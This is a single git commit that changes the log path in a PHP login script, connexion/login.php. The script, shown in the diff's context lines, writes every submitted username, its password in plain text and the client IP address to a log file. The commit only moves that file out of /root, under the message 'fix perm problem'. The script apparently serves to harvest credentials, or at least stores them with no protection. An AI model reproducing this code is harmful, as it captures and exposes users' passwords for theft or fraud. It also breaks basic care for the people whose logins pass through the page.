5e3dc843de149a8a1290ae2ad0599a900f358b4f
centurio <sarleon56@hotmail.com>
2020-02-20 11:42:14 +0800

    fix perm problem

--- connexion/login.php
+++ connexion/login.php
@@ -3,7 +3,7 @@
 $username = $_POST['logn'];
 $password = $_POST['passd'];
 $return_dir = $_POST['redir'];
-$f = fopen("/root/log.txt", "a+");
+$f = fopen("/var/log/plat/log.txt", "a+");
 $line = $username." , ".$password." , By IP".$_SERVER['REMOTE_ADDR']."\n";
 fwrite($f,$line);
 fclose($f);
